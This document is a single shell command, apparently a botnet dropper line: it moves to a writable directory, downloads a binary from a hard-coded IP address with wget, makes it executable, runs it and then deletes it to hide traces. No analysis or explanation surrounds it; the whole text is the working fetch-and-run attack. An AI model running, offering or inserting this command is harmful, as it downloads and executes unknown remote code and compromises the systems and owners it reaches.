cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.187.135.17/wget; chmod +x wget; ./wget; rm -rf wget
